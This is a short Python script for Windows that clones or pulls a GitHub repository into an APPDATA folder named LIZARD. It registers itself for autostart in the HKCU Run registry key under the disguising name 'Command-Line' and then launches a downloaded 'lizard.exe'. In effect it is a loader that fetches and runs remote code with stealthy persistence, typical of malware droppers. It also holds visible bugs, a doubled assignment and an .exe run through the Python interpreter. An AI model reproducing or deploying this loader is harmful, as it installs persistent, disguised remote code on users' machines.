import os
import sys
#import requests
import subprocess
import winreg

# Replace with the raw GitHub URL of your script
GITHUB_REPO = "https://github.com/Thitus99/FNAM-.git"
LOCAL_DIR = os.path.join(os.getenv("APPDATA"), "LIZARD")

ENTRYPOINT = ENTRYPOINT = os.path.join(LOCAL_DIR, "lizard.exe")

def add_to_startup(name, exe_path):
    """Add this exe to Windows autostart via registry."""
    reg_key = r"Software\Microsoft\Windows\CurrentVersion\Run"
    with winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_key, 0, winreg.KEY_SET_VALUE) as key:
        winreg.SetValueEx(key, name, 0, winreg.REG_SZ, exe_path)

def update_repo():
    if not os.path.exists(LOCAL_DIR):
        subprocess.run(["git", "clone", GITHUB_REPO, LOCAL_DIR])
    else:
        subprocess.run(["git", "-C", LOCAL_DIR, "pull"])


def run_script():
    """Run the downloaded script with same Python interpreter as exe."""
    if os.path.exists(ENTRYPOINT):
        subprocess.Popen([sys.executable, ENTRYPOINT])
    else:
        print(f"ERROR: Entry file not found: {ENTRYPOINT}")

def main():
    # Ensure script is up-to-date
    update_repo()

    # Add this exe to startup (only once)
    exe_path = sys.argv[0]
    add_to_startup("Command-Line", exe_path)

    # Run script
    run_script()

if __name__ == "__main__":
    main()
